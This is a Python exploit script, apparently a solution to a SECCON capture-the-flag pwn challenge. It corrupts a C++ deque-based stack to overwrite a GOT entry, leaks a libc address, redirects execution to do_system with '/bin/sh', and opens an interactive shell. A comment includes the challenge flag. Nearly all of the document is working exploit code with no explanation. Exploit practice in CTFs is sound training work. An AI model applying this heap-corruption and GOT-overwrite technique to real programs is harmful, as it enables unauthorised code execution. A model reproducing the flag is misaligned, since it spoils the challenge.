from flashlib import * # pip3 install pwn-flashlib

context.terminal = None
init("st_patched",aslr=True)

gdbscript = """
set max-visualize-chunk-size 0x500
break *0x402760
continue
"""

def set_name(n):
    sla(b"What's your name?", n.encode())

def s_push(x):
    sl(b"1")
    sl(str(x).encode())

def s_pop():
    sl(b"2")

def t_push(x):
    sl(b"3")
    sl(str(x).encode())

def t_pop():
    sl(b"4")
    
set_name("hexamine")

s_push(0x200000)

for i in range(25): #one more allocation, and it'll have to allocate a new map
    for i in range(64):
        t_push(0xdeadbeef)

for i in range(30): #spray pointers
    for i in range(64):
        s_push(0x4053c0-0x1f0) 
for i in range(30): 
    for i in range(64):
        s_pop()
for i in range(64):
    t_push(0xdeadbeef)

for i in range(26):
    for i in range(64):
        t_pop()

t_pop()
t_pop()

t_pop()
t_push(0x405000) # change the min addr of node in the deque structure
for i in range(23):
    t_pop()
    
t_push(0x8) #change the size of the std::string
t_pop()
t_pop()
t_push(0x405020) #change the string pointer to point to a got entry


for i in range(89):
    t_pop()
t_push(0x4013D5) #overwrite delete to some address in main before the name is printed

s_pop()
s_pop() #trigger delete -> get leak in main when the name string is printed

rcu(b"!")

rcu(b"Hello, ")
libc.address = fixleak(rcu("!")[:-1]) - 0x471f0
print("libc", hex(libc.address))
t_pop()
t_push(libc.address + 0x582d2) #do_system+2
for i in range(9):
    t_pop()

#attach(gdbscript=gdbscript)
t_push(u64(b"/bin/sh\x00"))
t_pop()
t_pop()
#SECCON{y0u_uNd3Rs74nd_H0w_t0_3xpLo1t_tH3_"stack"}

io.interactive()
